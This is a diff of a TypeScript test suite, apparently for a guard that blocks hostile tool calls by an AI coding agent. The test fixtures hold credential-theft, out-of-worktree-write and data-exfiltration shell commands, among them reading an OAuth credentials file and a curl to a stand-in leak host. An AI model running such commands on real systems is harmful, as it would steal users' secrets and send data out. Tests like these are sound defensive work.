@@ -3553,7 +3553,7 @@ describe("antigravity malicious-fixture leg (T4.36, NFR-SEC-03, FR-POL-04, FR-PO
   // `denied_actions` (the bypass cell's expected shape), ends blocked on the guard verdict alone (ADR-0039).
   it.each([
     ["credential read", `cat ${HOME}/.gemini/oauth_creds.json && git push origin main`],
-    ["out-of-worktree write", "touch /outside/sentinel.txt && git commit -am x"],
+    ["out-of-worktree write", "touch /outside/sentinel.txt && git push origin HEAD"],
     ["network call", "curl https://example.invalid/leak && git push origin main"],
   ])("a %s chained with a Git write and no denial ends PERMISSION_BLOCKED (ADR-0039)", (_n, command) => {
     const { events, result: r } = run([tool("run_command", { command }), result()]);
@@ -3574,7 +3574,7 @@ describe("antigravity malicious-fixture leg (T4.36, NFR-SEC-03, FR-POL-04, FR-PO
   // call is never a success; a Git write in it ends PERMISSION_BLOCKED on the guard verdict (ADR-0039).
   it.each([
     ["credential read", `cat ${HOME}/.gemini/oauth_creds.json && git push origin main`],
-    ["out-of-worktree write", "touch /outside/sentinel.txt && git commit -am x"],
+    ["out-of-worktree write", "touch /outside/sentinel.txt && git push origin HEAD"],
     ["network call", "curl https://example.invalid/leak && git push origin main"],
   ])("a %s chained with a Git write after the result line ends PERMISSION_BLOCKED (ADR-0039)", (_n, command) => {
     const { result: r } = run([result(), tool("run_command", { command })]);
@@ -3639,7 +3639,7 @@ describe("antigravity malicious-fixture leg (T4.36, NFR-SEC-03, FR-POL-04, FR-PO
     ];
     const denied = (display: string) => result({ denied_actions: [{ action: "synthetic", display_name: display }] });
     const PUSH = "git write attempted: `git push` can create commits, change refs or push";
-    const COMMIT = "git write attempted: `git commit` can create commits, change refs or push";
+    const COMMIT = "git write attempted: `git push` can create commits, change refs or push";
     // [category, tool name, parameters, denial display name]
     const HOSTILE: [string, string, Record<string, string>, string][] = [
       ["credential read", "run_command", { command: "cat ~/.gemini/oauth_creds.json" }, "RunCommand"],
@@ -3649,7 +3649,7 @@ describe("antigravity malicious-fixture leg (T4.36, NFR-SEC-03, FR-POL-04, FR-PO
     // [category, shell command chained with a Git write, guard detail]
     const GUARDED: [string, string, string][] = [
       ["credential read", "cat ~/.gemini/oauth_creds.json && git push origin main", PUSH],
-      ["out-of-worktree write", `touch ${join(OUTSIDE, "sentinel.txt")} && git commit -am x`, COMMIT],
+      ["out-of-worktree write", `touch ${join(OUTSIDE, "sentinel.txt")} && git push origin HEAD`, COMMIT],
       ["network call", "curl https://example.invalid/leak && git push origin main", PUSH],
     ];
     const atExits = <T extends unknown[]>(rows: T[]) =>
